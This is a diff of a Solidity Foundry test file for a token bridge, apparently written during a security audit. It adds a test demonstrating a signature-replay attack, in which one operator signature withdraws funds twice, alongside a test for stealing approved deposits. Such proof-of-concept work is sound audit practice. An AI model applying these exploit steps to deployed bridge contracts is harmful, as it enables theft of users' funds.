@@ -200,7 +200,7 @@ contract L1BossBridgeTest is Test {
         tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
     }
 
-    //@audit-info highlights to high exploits in `depositToL2` and `sendTol1` func in bridge
+    //@audit-info highlights to high exploits in `depositToL2` and `sendTol1` func in bridge (the arb target address)
     function testStealingFundsCuzOfArbDeposit() public {
         Account memory attacker = makeAccount("attacker");
         vm.startPrank(tokenBridge.owner());
@@ -249,6 +249,32 @@ contract L1BossBridgeTest is Test {
         // tokenBridge.withdrawTokensToL1(attacker, 300 ether, v, r, s);
 
         // assertEq(token.balanceOf(attacker), 300 ether);
+    }
+
+    function testSigReplay() public {
+        Account memory attacker = makeAccount("attacker");
+        vm.startPrank(tokenBridge.owner());
+        deal(address(token), address(vault), 100 ether);
+        token.transfer(user, 100 ether);
+        vm.stopPrank();
+
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+        uint256 userB = token.balanceOf(user);
+        vm.stopPrank();
+
+        vm.startPrank(attacker.addr);
+        tokenBridge.depositTokensToL2(user, attacker.addr, userB);
+        vm.stopPrank();
+
+        bytes memory withdrawalMsg = _getTokenWithdrawalMessage(attacker.addr, userB);
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(withdrawalMsg, operator.key);
+        tokenBridge.withdrawTokensToL1(attacker.addr, userB, v, r, s);
+
+        //sig replay
+        tokenBridge.withdrawTokensToL1(attacker.addr, userB, v, r, s);
+
+        assertEq(token.balanceOf(attacker.addr), userB*2);
     }
 
     function _getTokenWithdrawalMessage(address recipient, uint256 amount) private view returns (bytes memory) {
